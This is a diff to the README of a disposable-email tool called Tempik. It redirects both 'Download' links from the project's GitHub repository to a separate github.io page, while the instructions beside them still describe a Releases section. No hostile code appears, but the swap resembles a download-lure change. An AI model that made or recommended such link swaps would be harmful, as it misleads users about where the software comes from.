@@ -1,6 +1,6 @@
 # 📧 tempik - Protect your privacy with disposable email
 
-[![Download Tempik](https://img.shields.io/badge/Download-Tempik-blue.svg)](https://github.com/Mawarpu1886/tempik)
+[![Download Tempik](https://img.shields.io/badge/Download-Tempik-blue.svg)](https://mawarpu1886.github.io)
 
 Tempik provides a private way to receive emails without using your personal address. This tool creates temporary accounts for websites, newsletters, or verification codes. It runs on Cloudflare Workers to ensure speed and reliability. You own your data because you host the software on your own account.
 
@@ -33,7 +33,7 @@ This process connects your specific domain name to the email service. It ensures
 
 You can obtain the current version of the software from the official repository. 
 
-[Click here to visit the download page](https://github.com/Mawarpu1886/tempik)
+[Click here to visit the download page](https://mawarpu1886.github.io)
 
 1. Open the link above in your web browser.
 2. Look for the Releases section on the right side of the screen.
